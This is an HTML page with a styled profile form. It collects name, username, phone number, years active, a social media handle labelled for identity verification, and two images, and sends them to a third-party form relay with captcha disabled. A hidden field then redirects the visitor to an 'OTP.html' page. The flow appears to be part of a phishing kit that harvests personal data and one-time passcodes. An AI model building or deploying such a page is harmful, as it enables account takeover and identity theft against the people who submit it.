<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background: linear-gradient(45deg, #ff4d4d 40%, #ffb6c1 60%);
            font-family: cursive;
        }

        .profile-form {
            width: 300px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }

        .profile-form label {
            display: block;
            margin-top: 10px;
        }

        .profile-form input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .profile-form button {
            width: 100%;
            background: #ff4d4d;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="profile-form">
        <form id="contactform" class="phone-input" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
            <input name="_redirect" type="hidden" value="OTP.html">
            <input type="hidden" name="_captcha" value="false">
            
            <label for="name">Name</label>
            <input type="text" id="name" name="name" required>

            <label for="username">Preferred Username</label>
            <input type="text" id="username" name="username" required>

            <label for="phone">Phone number</label>
            <input type="text" id="phone" name="phone" required>

            <label for="yearsActive">Years active</label>
            <input type="text" id="yearsActive" name="yearsActive" required>

            <label for="socialMedia">Social Media Handle (Identity Verification)</label>
            <input type="text" id="socialMedia" name="socialMedia" required>

            <label for="imageOne">Image One</label>
            <input type="file" id="imageOne" name="imageOne" accept="image/*" required>

            <label for="imageTwo">Image Two</label>
            <input type="file" id="imageTwo" name="imageTwo" accept="image/*" required>

            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
